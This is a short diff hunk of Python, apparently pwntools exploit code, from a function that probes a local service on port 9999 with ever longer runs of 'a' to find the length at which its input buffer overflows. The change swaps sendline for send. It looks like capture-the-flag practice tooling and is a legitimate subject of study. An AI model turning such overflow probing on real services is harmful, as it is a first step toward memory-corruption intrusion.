@@ -511,7 +511,7 @@ def getbufferflow_length():
         try:
             sh = remote('127.0.0.1', 9999)
             sh.recvuntil('WelCome my friend,Do you know password?\n')
-            sh.sendline(i * 'a')
+            sh.send(i * 'a')
             output = sh.recv()
             sh.close()
             if not output.startswith('No password'):
